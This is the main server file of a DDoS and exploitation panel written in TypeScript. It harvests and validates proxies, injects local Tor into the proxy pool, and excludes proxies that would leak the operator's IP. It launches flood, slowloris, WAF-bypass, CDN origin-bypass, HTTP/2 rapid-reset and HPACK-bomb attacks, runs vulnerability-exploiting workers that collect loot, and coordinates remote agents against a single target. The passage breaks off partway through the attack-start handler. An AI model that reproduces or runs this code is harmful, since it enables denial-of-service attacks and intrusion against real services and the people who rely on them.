import express from "express";
import { createHmac } from "crypto";
import { readFileSync, writeFileSync, mkdirSync, existsSync } from "fs";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";

import bodyParser from "body-parser";
import { currentPath, loadUserAgents } from "./fileLoader";
import { AttackMethod, Proxy } from "./lib";
import { selectSmartProxies } from "./proxy/proxyUtils";
import { proxyManager, geoipStatus } from "./proxy/proxyManager";
import { vulnQueue } from "./queue/vulnQueue";
// @ts-ignore — JS module, no .d.ts
import { runOrchestrator } from "./exploit/chainOrchestrator.js";
import {
  DEFAULT_SOURCES,
  Source,
  fetchAllProxies,
  loadProxyFileFallback,
  loadPremiumProxyFile,
  loadSources,
  anonymityProbe,
  saveSources,
  validateProxies,
  validateWithResults,
  validateAgainstTarget,
} from "./proxy/proxyFetcher";
import { discoverOrigin } from "./recon/originIp";
import {
  attachAgentHub,
  broadcastStart as agentBroadcastStart,
  broadcastStop  as agentBroadcastStop,
  getAgentCount,
  getAgentSnapshot,
  getAgentToken,
} from "./agentHub";

function getErrorMessage(error: unknown) {
  return error instanceof Error ? error.message : String(error);
}

function isProxyWorkerEvent(message: unknown): message is { proxyEvent: "ok" | "fail"; proxy: Proxy; latencyMs?: number } {
  return (
    typeof message === "object" &&
    message !== null &&
    "proxyEvent" in message &&
    "proxy" in message &&
    ((message as { proxyEvent?: unknown }).proxyEvent === "ok" ||
      (message as { proxyEvent?: unknown }).proxyEvent === "fail")
  );
}

const attackWorkers: { [key in AttackMethod]: string } = {
  http_flood: "./workers/httpFloodAttack.js",
  http_bypass: "./workers/httpBypassAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
  cpp_bypass: "./workers/cppBridgeAttack.js",
  stream_drain: "./workers/streamDrainAttack.js",
};

function clampNumber(value: unknown, min: number, max: number, fallback: number): number {
  const n = Number(value);
  if (!Number.isFinite(n)) return fallback;
  return Math.min(max, Math.max(min, Math.floor(n)));
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const __prod = process.env.NODE_ENV === "production";

const CORS_ORIGIN = process.env.CORS_ORIGIN ?? (__prod ? "https://angelcore.cc" : "http://localhost:5173");
const AUTO_REFRESH_MINUTES = parseInt(process.env.PROXY_REFRESH_MIN || "15");

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: { origin: CORS_ORIGIN || false, methods: ["GET", "POST"], allowedHeaders: ["Content-Type"] },
});

// Vuln Queue listens to the same io so the Hunter/Exploiter pipeline can
// stream findings + exploit results directly to the React panels.
vulnQueue.bindSocket(io);

// Remote agent hub — VPS / friends connect here with ws://HOST:PORT/agent?token=TOKEN
attachAgentHub(httpServer, io);

// ───────────────────── Safe Local Mode ─────────────────────
//
// User-controlled "не разносить мою домашнюю сеть" tumbler. Default ON.
//
//   ON  — validation/worker concurrency stays low enough not to fill a
//         home router's NAT table. ~400 concurrent TCP sockets max,
//         linear 10s ramp-up on attack start, bg validation paused while
//         an attack is active.
//   OFF — original numbers (the ones that used to nuke the user's link).
//         Intended for VPS / corp connections that can handle 4k+ sockets.
//
// State lives at module scope because validation runs from multiple
// origins (bootstrap, refresh API, background tick, socket handler).
let safeMode = true;

function safeConcurrency(unsafe: number, safe: number): number {
  return safeMode ? safe : unsafe;
}

// ───────────────────── Proxy source mode ─────────────────────
// "free"    → fetch from github lists + fall back to data/proxies.txt
// "premium" → load only data/proxies-premium.txt (paid datacenter/residential)
//
// Switching modes wipes the ProxyManager and reloads — premium pools are
// typically <1k IPs so the full reload is fast.
let proxySource: "free" | "premium" = "free";

// When true, selectSmartProxies() uses proxyManager.usableAnonymous() which
// excludes confirmed-transparent proxies. Default TRUE — the operator
// almost never wants their real IP leaked to the target via X-Forwarded-For.
// Proxies with unknown anonymity stay in the pool (they're not confirmed
// to leak), so this default doesn't shrink the usable set until the
// background sweep actually identifies leakers.
let skipTransparent = true;

// Background anonymity sweep — runs at idle, picks N proxies that haven't
// been probed yet, classifies them, marks transparent ones for exclusion.
// Tuned conservatively (5 every 30s = 600/hour) so we don't burn through
// httpbin's free-tier quota and don't add load while the operator is
// running a real attack.
const BG_ANON_BATCH = 5;
const BG_ANON_INTERVAL_MS = 30_000;

async function backgroundAnonymitySweep(): Promise<void> {
  // Skip while attack is running — we'd be competing with the worker
  // pool for the same upstream proxies and adding probe noise to logs.
  if (isAttackActive()) return;
  const usable = proxyManager.usable();
  // Pick proxies with anonymity===undefined (never probed). list() exposes
  // that field; the manager's own `health` map is private, so we filter
  // from the public snapshot.
  const candidates = proxyManager
    .list(1000)
    .filter((r) => !r.anonymity && r.state === "alive" && (r.protocol === "http" || r.protocol === "https"))
    .slice(0, BG_ANON_BATCH);
  if (candidates.length === 0) return;
  for (const row of candidates) {
    const p = usable.find((x) => x.host === row.host && x.port === row.port);
    if (!p) continue;
    const result = await anonymityProbe(p, 5000);
    if (result) proxyManager.setAnonymity(p, result);
  }
}

setInterval(() => {
  backgroundAnonymitySweep().catch((e) =>
    console.warn("[anonymity] bg sweep failed:", getErrorMessage(e)),
  );
}, BG_ANON_INTERVAL_MS);

// True when at least one client has an attack in flight. Background
// validation pauses on this while safe mode is on — running it during an
// attack burns ephemeral ports we'd rather give to the worker pool.
function isAttackActive(): boolean {
  return socketWorkers.size > 0;
}

// ───────────────────── Proxy pool state ─────────────────────

interface ProxyState {
  source: "github" | "file" | "none";
  fetchedAt: number;
  fromCache: boolean;
  report?: { name: string; count: number; ok: boolean; error?: string }[];
}
const proxyState: ProxyState = { source: "none", fetchedAt: 0, fromCache: false };

const userAgents = loadUserAgents();

/** Serialize a proxy list to a file. */
function writeProxiesTo(file: string, list: Proxy[]): void {
  if (!existsSync(dirname(file))) mkdirSync(dirname(file), { recursive: true });
  const lines = list.map((p) => {
    const auth = p.username && p.password ? `${p.username}:${p.password}@` : "";
    return `${p.protocol}://${auth}${p.host}:${p.port}`;
  });
  writeFileSync(file, lines.join("\n") + "\n", "utf-8");
}

const RUNTIME_PROXIES_FILE = () => join(currentPath(), ".cache", "runtime-proxies.txt");

/** Path the C++ engine reads from at attack-launch time. We point it at a
 *  separate file so we can rewrite data/proxies.txt anytime without racing
 *  the engine's open file handle. */
function writeRuntimeProxies(list: Proxy[]): string {
  const path = RUNTIME_PROXIES_FILE();
  writeProxiesTo(path, list);
  return path;
}

function writeProxiesFile(list: Proxy[]): void {
  writeProxiesTo(join(currentPath(), "data", "proxies.txt"), list);
}

function broadcastPool() {
  const s = proxyManager.stats();
  io.emit("stats", {
    log: `Пул: ${s.total} · провер ${s.validated} · жив ${s.alive} · непровер ${s.unverified} · мертв ${s.dead}`,
    bots: s.alive,
    proxies_total: s.total,
    proxies_alive: s.alive,
    proxies_cooldown: s.cooldown,
    proxies_dead: s.dead,
  });
}

/** Validate a batch of unverified proxies and feed results back into the manager.
 *  Returns the number of proxies that were validated as alive. */
async function validateBatch(batch: Proxy[], timeoutMs = 4000, concurrency = 250): Promise<number> {
  const results = await validateWithResults(batch, { concurrency, timeoutMs });
  let alive = 0;
  for (const r of results) {
    if (r.alive) {
      proxyManager.markSuccess(r.proxy);
      alive++;
    } else {
      proxyManager.markFail(r.proxy);
    }
  }
  return alive;
}

/** Initial validation sweep — chunks the unverified pool and runs each chunk
 *  through handshake validation. Broadcasts progress to UI. */
let initialSweepRunning = false;
async function initialValidationSweep(): Promise<void> {
  if (initialSweepRunning) return;
  initialSweepRunning = true;
  try {
    const queue = proxyManager.unverified();
    if (!queue.length) return;
    const chunkSize = 1000;
    let validated = 0;
    const sweepConc = safeConcurrency(300, 30);
    io.emit("stats", { log: `🔍 Стартовая валидация ${queue.length} прокси · concurrency=${sweepConc}${safeMode ? " (safe mode)" : ""}` });
    for (let i = 0; i < queue.length; i += chunkSize) {
      const chunk = queue.slice(i, i + chunkSize);
      const alive = await validateBatch(chunk, 4000, sweepConc);
      validated += alive;
      const s = proxyManager.stats();
      io.emit("stats", {
        log: `  validated ${Math.min(i + chunkSize, queue.length)}/${queue.length} · alive +${alive} (всего ${s.alive})`,
        bots: s.alive,
        proxies_total: s.total,
        proxies_alive: s.alive,
        proxies_cooldown: s.cooldown,
        proxies_dead: s.dead,
      });
    }
    io.emit("stats", { log: `✅ Валидация завершена: ${validated} рабочих из ${queue.length}` });
  } finally {
    initialSweepRunning = false;
  }
}

async function refreshProxies(opts: {
  validate?: boolean;
  countries?: string[];
  excludeCountries?: string[];
  maxTotal?: number;
  useCache?: boolean;
} = {}): Promise<void> {
  console.log("[proxies] refresh", opts, "source =", proxySource);

  // Premium path: skip github + fallback, load only the curated paid list.
  // No country filter (the user explicitly chose these IPs). Always re-read
  // the file so edits land without a server restart.
  if (proxySource === "premium") {
    const premium = loadPremiumProxyFile();
    proxyManager.replace(premium);
    proxyState.source = premium.length ? "file" : "none";
    proxyState.fetchedAt = Date.now();
    proxyState.fromCache = false;
    proxyState.report = [{ name: "data/proxies-premium.txt", count: premium.length, ok: premium.length > 0 }];
    if (premium.length > 0) {
      writeProxiesFile(premium); // canonical file the C++ engine reads
    }
    broadcastPool();
    // Run validation in the background — paid pools are small so this finishes quickly.
    initialValidationSweep().catch((e) =>
      console.warn("[proxies] premium sweep failed:", getErrorMessage(e)),
    );
    return;
  }

  const report = await fetchAllProxies({
    countries: opts.countries,
    excludeCountries: opts.excludeCountries,
    maxTotal: opts.maxTotal,
    useCache: opts.useCache ?? true,
  });

  let list = report.proxies;
  console.log(`[proxies] ${list.length} unique (raw ${report.totalBeforeDedup}) in ${report.durationMs}ms${report.fromCache ? " [cache]" : ""}`);

  if (opts.validate && list.length) {
    const before = list.length;
    const refreshConc = safeConcurrency(300, 30);
    list = await validateProxies(list, { concurrency: refreshConc, timeoutMs: 4000 });
    console.log(`[proxies] handshake-validated: ${list.length}/${before} alive (conc=${refreshConc})`);
  }

  if (list.length === 0) {
    console.warn("[proxies] github empty, using data/proxies.txt");
    list = loadProxyFileFallback();
    proxyState.source = list.length ? "file" : "none";
  } else {
    proxyState.source = "github";
    writeProxiesFile(list); // critical: C++ engine reads from this file
  }

  proxyManager.replace(list);
  proxyState.fetchedAt = Date.now();
  proxyState.fromCache = report.fromCache;
  proxyState.report = report.perSource;
  broadcastPool();

  // Kick off background validation of any newly-unverified proxies.
  // Runs async — does not block the refresh response.
  initialValidationSweep().catch((e) =>
    console.warn("[proxies] sweep failed:", getErrorMessage(e)),
  );
}

// Block server startup until the first refresh finishes — prevents attacks
// firing with an empty pool. If GitHub is unreachable, fall back to disk.
async function bootstrap() {
  try {
    await refreshProxies();
  } catch (e) {
    console.error("[proxies] initial refresh failed:", getErrorMessage(e));
    const fallback = loadProxyFileFallback();
    proxyManager.replace(fallback);
    proxyState.source = fallback.length ? "file" : "none";
    proxyState.fetchedAt = Date.now();
  }
}

// Auto-refresh on interval — keeps the pool fresh without user action.
setInterval(() => {
  refreshProxies().catch((e) => console.error("[proxies] auto-refresh failed:", getErrorMessage(e)));
}, AUTO_REFRESH_MINUTES * 60 * 1000);

// Smart background validation — only touches proxies that actually need it:
//   • Unvalidated (new from harvest): always priority-1, checked immediately
//   • Stale (not confirmed in >5 min): checked when pool is quiet
//   • Recently validated (<5 min ago): SKIPPED — no network waste
//   • Dead (quarantined): SKIPPED — they won't recover until deadUntil
//
// During attack: only unvalidated proxies (100 concurrent) — we don't want
// hundreds of validation handshakes competing with actual attack traffic.
// Between attacks: stale + unvalidated at full concurrency (600).
setInterval(async () => {
  const attacking = isAttackActive();

  if (attacking) {
    // During attack: only onboard brand-new proxies (never seen before).
    // stale(0) returns unvalidated + ALL stale, so filter to unvalidated-only
    // by using a very large minAgeSec so stale() only returns unvalidated.
    const pool = proxyManager.stale(999_999);
    if (!pool.length) return;
    const subset = pool.slice(0, 300);
    try {
      const results = await validateWithResults(subset, { concurrency: 100, timeoutMs: 2500 });
      for (const r of results) {
        if (r.alive) proxyManager.markSuccess(r.proxy);
        else proxyManager.markFail(r.proxy);
      }
    } catch { /* ignore */ }
    return;
  }

  // Idle: validate everything stale (not seen in 5+ min) + all unvalidated.
  const pool = proxyManager.stale(300); // 5-minute freshness window
  if (!pool.length) return;

  const sampleSize = safeMode ? 500 : 1500;
  const conc = safeConcurrency(600, 250);
  const subset = pool.slice(0, sampleSize);
  try {
    const results = await validateWithResults(subset, { concurrency: conc, timeoutMs: 2500 });
    for (const r of results) {
      if (r.alive) proxyManager.markSuccess(r.proxy);
      else proxyManager.markFail(r.proxy);
    }
  } catch (e) {
    console.warn("[proxies] bg validation failed:", getErrorMessage(e));
  }
}, 40_000);

console.log("User agents loaded:", userAgents.length);

// ─── Tor SOCKS5 auto-detection ────────────────────────────────────────────────
//
// If the local machine has Tor Browser or Tor daemon running, its SOCKS5
// proxy is effectively a free, rotating-circuit proxy.  We probe the four
// common ports and, on success, inject a socks5h://127.0.0.1:<port> entry
// into the live proxy pool via addMany() — no restart required.
//
// Detection is a raw TCP SOCKS5 handshake: send {VER=5, NMETHODS=1, METHOD=0}
// (no-auth) and expect {VER=5, METHOD=0} back.  A Tor SOCKS5 port responds
// immediately; anything else closes the socket or returns different bytes.
import { Socket as _TcpSocket } from "net";

async function probeTorSocks5(port: number): Promise<boolean> {
  return new Promise((resolve) => {
    const sock = new _TcpSocket();
    const timer = setTimeout(() => { sock.destroy(); resolve(false); }, 1500);
    sock.connect(port, "127.0.0.1", () => {
      sock.write(Buffer.from([0x05, 0x01, 0x00])); // SOCKS5 NMETHODS=1 METHOD=NO_AUTH
    });
    sock.once("data", (buf) => {
      clearTimeout(timer);
      sock.destroy();
      resolve(buf.length >= 2 && buf[0] === 0x05 && buf[1] === 0x00);
    });
    sock.once("error", () => { clearTimeout(timer); resolve(false); });
    sock.once("close", () => { clearTimeout(timer); resolve(false); });
  });
}

async function detectAndInjectTor(): Promise<void> {
  const TOR_PORTS = [9050, 9051, 9150, 9151];
  for (const port of TOR_PORTS) {
    const ok = await probeTorSocks5(port);
    if (!ok) continue;
    const torProxy = { protocol: "socks5" as const, host: "127.0.0.1", port };
    proxyManager.addMany([torProxy]);
    console.log(`[tor] Detected SOCKS5 on port ${port} — injected into proxy pool`);
    // Validate immediately so it goes live before the first attack
    try {
      const { validateWithResults: _v } = await import("./proxy/proxyFetcher.js");
      const results = await _v([torProxy], { concurrency: 1, timeoutMs: 8_000 });
      for (const r of results) {
        if (r.alive) proxyManager.markSuccess(r.proxy);
      }
    } catch { /* Tor available but validation target unreachable — still keep in pool */ }
    break; // one Tor exit at a time is enough
  }
}

// Run detection at startup (non-blocking) and every 5 minutes (Tor Browser
// might be started after the server is running).
detectAndInjectTor().catch(() => { /* no Tor — silently ignore */ });
setInterval(() => { detectAndInjectTor().catch(() => {}); }, 5 * 60_000);

app.use(express.static(join(__dirname, "public")));

// ───────────────────── Socket.IO ─────────────────────

const socketWorkers = new Map<string, Worker>();

// Per-socket Hunter + Exploiter workers. The Hunter posts findings to the
// main thread; the main thread routes exploitable findings to its paired
// Exploiter worker. Keyed by socket.id so a UI tab refresh terminates the
// previous pair on the disconnect handler.
const hunterWorkers = new Map<string, Worker>();
const exploiterWorkers = new Map<string, Worker>();

// Wire Hunter -> Exploiter for a given socket. Called once when the user
// kicks off a scan. Setting up the bridge here (not inside the Hunter
// worker) keeps the cross-worker contract simple: workers only talk to
// the main thread, never to each other.
function ensureExploiter(socketId: string, authHeaders: Record<string, string>): Worker {
  let exp = exploiterWorkers.get(socketId);
  if (exp) return exp;
  exp = new Worker(join(__dirname, "./exploit/exploiterWorker.js"), {
    workerData: { ratePerSec: 5, authHeaders },
  });
  exp.on("message", (msg) => {
    if (!msg || typeof msg !== "object") return;
    switch (msg.type) {
      case "log":
        io.to(socketId).emit("vuln_log", { level: msg.level, message: `[exploit] ${msg.message}` });
        break;
      case "exploit_progress":
        io.to(socketId).emit("exploit_progress", { id: msg.id, status: msg.status, message: msg.message });
        break;
      case "exploit_done":
        vulnQueue.applyLoot(msg.id, msg.loot);
        break;
    }
  });
  exp.on("error", (e) => {
    io.to(socketId).emit("vuln_log", { level: "error", message: `Exploiter crashed: ${getErrorMessage(e)}` });
  });
  exp.on("exit", (code) => {
    exploiterWorkers.delete(socketId);
    if (code !== 0) {
      io.to(socketId).emit("vuln_log", { level: "warn", message: `Exploiter exited (code ${code})` });
    }
  });
  exploiterWorkers.set(socketId, exp);
  return exp;
}

// Derive a browser-only token from AGENT_TOKEN. Raw AGENT_TOKEN stays
// server-side; only this derived value is sent to ddos-access browser clients.
const BROWSER_CLIENT_TOKEN = createHmac("sha256", process.env.AGENT_TOKEN || "mmbeam-default")
  .update("browser-client")
  .digest("hex")
  .slice(0, 32);

io.use((socket, next) => {
  const tok: unknown = socket.handshake.auth?.token;
  if (typeof tok === "string" && tok === BROWSER_CLIENT_TOKEN) return next();
  next(new Error("unauthorized"));
});

io.on("connection", (socket) => {
  console.log("Client connected", socket.id);
  const s = proxyManager.stats();
  socket.emit("stats", {
    pps: 0,
    bots: s.alive,
    totalPackets: 0,
    proxies_total: s.total,
    proxies_alive: s.alive,
    proxies_cooldown: s.cooldown,
    proxies_dead: s.dead,
    log: `Connected. Pool: ${s.total} (alive ${s.alive}), source=${proxyState.source} · safe mode ${safeMode ? "ON" : "OFF"}`,
  });
  // Push the current safe-mode value so the UI tumbler reflects server state
  // on (re)connect, not just on user click. The setting is global per server
  // process so all connected clients see the same tumbler position.
  socket.emit("safeMode", { enabled: safeMode });
  socket.emit("proxySource", { source: proxySource });

  // UI tumbler — flipped client-side, persisted server-side. Default ON.
  socket.on("setSafeMode", (params) => {
    const enabled = !!(params && params.enabled);
    if (enabled === safeMode) return;
    safeMode = enabled;
    io.emit("safeMode", { enabled: safeMode });
    io.emit("stats", {
      log: enabled
        ? "🛡 Локальный безопасный режим ON · cap ~400 connections, slow ramp"
        : "⚠ Локальный безопасный режим OFF · full fan-out (only do this on VPS / corp link)",
    });
  });

  // Proxy source toggle — switches between free (github) and premium pools.
  // Triggers a fresh refresh against the new source so the pool reloads.
  socket.on("setProxySource", async (params) => {
    const next: "free" | "premium" =
      params && params.source === "premium" ? "premium" : "free";
    if (next === proxySource) return;
    proxySource = next;
    io.emit("proxySource", { source: proxySource });
    io.emit("stats", {
      log: next === "premium"
        ? "💎 Источник прокси: PREMIUM (data/proxies-premium.txt) — загружаю..."
        : "📦 Источник прокси: FREE (github) — обновляю...",
    });
    try {
      await refreshProxies({ validate: false });
      io.emit("stats", { log: `✅ Пул переключён на ${next === "premium" ? "premium" : "free"}` });
    } catch (e) {
      io.emit("stats", { log: `❌ Ошибка переключения: ${getErrorMessage(e)}` });
    }
  });

  socket.on("startAttack", async (params) => {
    try {
      const { target, duration, packetDelay, attackMethod, packetSize, useHarvest, directMode, pattern, jitter, subresources, maxPower, httpMethod, httpBody, httpContentType, httpCookie, httpHeaders, autoTune, urlRotation, cacheBust, varyHeaders, originIp, originPort, rapidReset, rangeAmplify, parallelPools, hpackBomb, maxUploadMbps, streamMode, streamConcurrency } = params;
      if (typeof target !== "string" || !target.trim()) {
        socket.emit("stats", { log: "Target is required" });
        socket.emit("attackEnd");
        return;
      }

      const attackWorkerFile = attackWorkers[attackMethod as AttackMethod];
      if (!attackWorkerFile) {
        socket.emit("stats", { log: `Unsupported attack type: ${attackMethod}` });
        socket.emit("attackEnd");
        return;
      }

      // ─── F: Pre-flight cookie validation ────────────────────────────
      // The operator's session cookie may already be dead (expired, rotated,
      // re-keyed by middleware). Without this check we'd spin up 1500 workers
      // and watch a 100% 307 → /login storm for 30 seconds before noticing.
      // One probe up front saves the run. We only nag — not abort — because
      // the operator may legitimately want to load-test the redirect path.
      if (attackMethod === "cpp_bypass" && typeof httpCookie === "string" && httpCookie.trim()) {
        const probeUrl = target.startsWith("http") ? target : `https://${target}`;
        try {
          const c = new AbortController();
          const t = setTimeout(() => c.abort(), 8_000);
          const r = await fetch(probeUrl, {
            method: typeof httpMethod === "string" && httpMethod.toUpperCase() === "POST" ? "GET" : "GET",
            signal: c.signal,
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
              "Cookie": httpCookie.trim(),
            },
            redirect: "manual",
          });
          clearTimeout(t);
          const loc = (r.headers.get("location") || "").toLowerCase();
          const looksLikeLogin = loc.includes("login") || loc.includes("/signin") || loc.includes("/auth");
          const dead =
            (r.status >= 400 && r.status < 500) ||
            (r.status >= 300 && r.status < 400 && looksLikeLogin);
          if (dead) {
            socket.emit("stats", {
              log: `🍪 Pre-flight: cookie мёртв · status ${r.status}${loc ? ` → ${loc}` : ""}. Атака не запущена. Перепроверь cookie в браузере и пере-probe цель.`,
            });
            socket.emit("attackEnd");
            return;
          }
          socket.emit("stats", { log: `🍪 Pre-flight OK · ${r.status} с твоим cookie — стартую атаку` });
        } catch (e) {
          socket.emit("stats", {
            log: `⚠ Pre-flight check failed (${getErrorMessage(e)}) · запускаю атаку с непроверенным cookie`,
          });
        }
      }

      // Free proxies fall over when we create unlimited parallel work. Clamp the
      // knobs server-side so a bad UI value does not DOS the local worker first.
      const safePacketDelay = clampNumber(packetDelay, 25, 10_000, 50);
      const safePacketSize = clampNumber(packetSize, 1, 8192, 512);
      const maxInflight = clampNumber(params.maxInflight, 1, 500, 200);
      const isCpp = attackMethod === "cpp_bypass";
      // Direct mode only makes sense for the C++ engine — Node workers don't
      // have a "no proxy" code path. Silently downgrade if requested elsewhere.
      const useDirect = !!directMode && isCpp;

      // ─── Auto-trigger harvester ─────────────────────────────────
      //
      // When the user requests WAF bypass we kick the Playwright harvester
      // ahead of the C++ engine startup so the first attack workers find
      // a fresh cf_clearance / __cf_bm cookie waiting at /get_session.
      // Without this nudge the user had to POST /harvest manually.
      if (useHarvest && isCpp) {
        const harvestUrl = target.startsWith("http") ? target : `https://${target}`;
        const harvesterPort = 3001;
        fetch(`http://127.0.0.1:${harvesterPort}/harvest`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ target: harvestUrl, count: 3, headless: true }),
        }).then((r) => {
          if (r.ok) {
            socket.emit("stats", { log: `🌾 Harvester pre-warming для ${harvestUrl}` });
          }
        }).catch(() => {
          // Harvester not running — the C++ engine will surface this via its
          // own probe and log a friendly hint.
        });
      }

      let filteredProxies: Proxy[] = [];
      let runtimeFile = "";
      let autoWorkers: number;
      let autoInflight: number;

      if (useDirect) {
        // Direct mode bypasses the pool entirely. Safe mode keeps total
        // local TCP fan-out around 400 sockets so a home router's NAT
        // table doesn't fill up. Off mode runs the original numbers.
        // MAX POWER override: lifts the autotune ceiling to 2000×16.
        // AUTOTUNE override: starts gentle (~25% of normal) so the saturation
        // watchdog has a clean baseline to detect origin overload against.
        if (autoTune) {
          autoWorkers = 250;
          autoInflight = 4;
        } else if (maxPower) {
          autoWorkers = 2000;
          autoInflight = 16;
        } else if (safeMode) {
          autoWorkers = 50;
          autoInflight = 8;
        } else {
          autoWorkers = 1000;
          autoInflight = 16;
        }
        const pstats = proxyManager.stats();
        socket.emit("stats", {
          log: `DIRECT режим${maxPower ? " · 💀 MAX POWER" : safeMode ? " · safe" : ""}: workers=${autoWorkers} inflight=${autoInflight}`,
          bots: 0,
          proxies_total: pstats.total,
          proxies_alive: pstats.alive,
          proxies_cooldown: pstats.cooldown,
          proxies_dead: pstats.dead,
        });
      } else {
        // For Node workers we MUST have validated proxies — otherwise nearly every
        // request will fail and the attack is pointless.
        // For C++ engine, fall back to the unverified pool only if there's no
        // validated set yet (fresh boot, sweep still running). Engine has its own
        // retry logic that can survive unhealthy proxies.
        // OPSEC switch — operator wants only proxies that don't leak the real
        // client IP in X-Forwarded-For. usableAnonymous() drops confirmed-
        // transparent ones; everything not yet probed stays in the pool.
        const usable = skipTransparent ? proxyManager.usableAnonymous() : proxyManager.usable();
        let pool = usable;
        if (pool.length === 0) {
          if (isCpp && proxyManager.size() > 0) {
            pool = proxyManager.all();
            socket.emit("stats", {
              log: `⚠ Валидация ещё идёт. C++ запускается на сыром пуле (${pool.length}). Качество вырастет по мере проверки.`,
            });
          } else {
            socket.emit("stats", {
              log: "❌ Нет провалидированных прокси. Подожди завершения стартовой валидации или нажми «обновить».",
            });
            socket.emit("attackEnd");
            return;
          }
        }

        filteredProxies = selectSmartProxies(pool, attackMethod as AttackMethod);

        if (filteredProxies.length === 0) {
          socket.emit("stats", { log: `❌ В пуле нет прокси протоколов подходящих для ${attackMethod}` });
          socket.emit("attackEnd");
          return;
        }

        // Write the selected pool to a stable runtime path so the C++ engine
        // doesn't race with our auto-refresh cycle rewriting data/proxies.txt.
        runtimeFile = writeRuntimeProxies(filteredProxies);

        // Auto-tune C++ engine workers to actual pool size — large worker counts
        // on tiny pools cause Windows TCP exhaustion and access violations.
        // Safe mode further caps total fan-out at ~400 concurrent TCP sockets
        // (100 workers × 4 in-flight) so a home NAT table survives.
        // MAX POWER override: 1500 workers × 16 inflight = 24k concurrent.
        // AUTOTUNE override: 25% of the normal proxy mode — gentle start so
        // the ramp pattern + saturation watchdog can find the real ceiling.
        if (autoTune) {
          autoWorkers = Math.min(200, Math.max(10, Math.floor(filteredProxies.length / 8)));
          autoInflight = 2;
        } else if (maxPower) {
          // MAX POWER: 1 worker per proxy (guarantees full saturation), capped at 3000.
          // Each worker has 24 inflight → 3000 proxies × 24 = 72k concurrent sockets.
          autoWorkers = Math.min(3000, Math.max(100, filteredProxies.length));
          autoInflight = 24;
        } else if (safeMode) {
          autoWorkers = Math.min(200, Math.max(10, Math.floor(filteredProxies.length / 3)));
          autoInflight = 4;
        } else {
          autoWorkers = Math.min(1000, Math.max(20, Math.floor(filteredProxies.length * 0.75)));
          autoInflight = filteredProxies.length < 100 ? 4 : 12;
        }

        const pstats = proxyManager.stats();
        socket.emit("stats", {
          log: `Отобрано ${filteredProxies.length} прокси для ${attackMethod}${maxPower ? " · 💀 MAX POWER" : safeMode ? " · safe" : ""} · workers=${autoWorkers} inflight=${autoInflight}`,
          bots: filteredProxies.length,
          proxies_total: pstats.total,
          proxies_alive: pstats.alive,
          proxies_cooldown: pstats.cooldown,
          proxies_dead: pstats.dead,
        });

        // Kick off a fresh proxy harvest in the background so the pool grows
        // during the attack. New proxies won't affect the running C++ engine
        // (it reads from a fixed file) but will be ready for the next wave.
        refreshProxies().catch(() => {});
      }

      // Autotune mode overrides pattern + jitter so the engine ramps load
       // gradually with realistic timing. The operator's chosen pattern/jitter
       // are ignored when autoTune is on — the whole point is the engine
       // picks a profile that lets the saturation watchdog find the ceiling.
      const finalPattern = autoTune ? "ramp" : pattern;
      const finalJitter  = autoTune ? "pareto" : jitter;

      const worker = new Worker(join(__dirname, attackWorkerFile), {
        workerData: {
          target,
          proxies: filteredProxies,
          userAgents,
          duration,
          packetDelay: safePacketDelay,
          packetSize: safePacketSize,
          maxInflight,
          useHarvest,
          directMode: useDirect,
          pattern: finalPattern,
          jitter: finalJitter,
          subresources: !!subresources,
          safeMode: safeMode && !maxPower, // MAX POWER overrides safe
          maxPower: !!maxPower,
          httpMethod: typeof httpMethod === "string" ? httpMethod : "",
          httpBody: typeof httpBody === "string" ? httpBody : "",
          httpContentType: typeof httpContentType === "string" ? httpContentType : "",
          httpCookie: typeof httpCookie === "string" ? httpCookie : "",
          httpHeaders: Array.isArray(httpHeaders) ? httpHeaders : [],
          urlRotation: Array.isArray(urlRotation)
            ? urlRotation.filter((u: unknown): u is string => typeof u === "string" && u.trim().length > 0).slice(0, 100)
            : [],
          cacheBust: !!cacheBust,
          varyHeaders: !!varyHeaders,
          // Phase-2 — Origin-IP CDN bypass. Validated server-side so an
          // attacker-controlled UI can't poison the C++ args (we reject
          // anything that isn't a plain IPv4 dotted-quad).
          originIp:
            typeof originIp === "string" && /^\d+\.\d+\.\d+\.\d+$/.test(originIp.trim())
              ? originIp.trim()
              : "",
          originPort:
            typeof originPort === "number" && originPort > 0 && originPort < 65536
              ? originPort
              : 0,
          // L8 — Asymmetric DoS toolset. All booleans; max-mbps is a positive
          // float. Server-side validation is intentionally lenient (booleanish
          // coercion) because the C++ engine already validates the values.
          rapidReset: !!rapidReset,
          rangeAmplify: !!rangeAmplify,
          parallelPools: !!parallelPools,
          hpackBomb: !!hpackBomb,
          maxUploadMbps:
            typeof maxUploadMbps === "number" && maxUploadMbps > 0 && maxUploadMbps < 10000
              ? maxUploadMbps
              : 0,
          // L8 — Stream drain attack parameters. Whitelisted set so the UI
          // can't poison the worker with arbitrary values.
          streamMode:
            streamMode === "sse" || streamMode === "ws" || streamMode === "auto"
              ? streamMode : "auto",
          streamConcurrency:
            typeof streamConcurrency === "number" &&
            streamConcurrency > 0 && streamConcurrency <= 5000
              ? streamConcurrency : 200,
          runtimeProxiesFile: runtimeFile,
          workers: autoWorkers,
          inflight: autoInflight,
        },
      });

      worker.on("message", (message: unknown) => {
        // Proxy health signals from workers: { proxyEvent: "ok"|"fail", proxy }
        if (isProxyWorkerEvent(message)) {
          if (message.proxyEvent === "ok") proxyManager.markSuccess(message.proxy, message.latencyMs);
          else proxyManager.markFail(message.proxy);
          return;
        }
        socket.emit("stats", message);
      });
      worker.on("error", (error) => {
        const message = getErrorMessage(error);
        console.error(`Worker error: ${message}`);
        socket.emit("stats", { log: `Worker error: ${message}` });
      });
      worker.on("exit", (code) => {
        console.log(`Worker exited code=${code}`);
        socketWorkers.delete(socket.id);
        socket.emit("attackEnd");
      });

      socketWorkers.set(socket.id, worker);

      // Tell remote agents to start firing the same target.
      if (getAgentCount() > 0) {
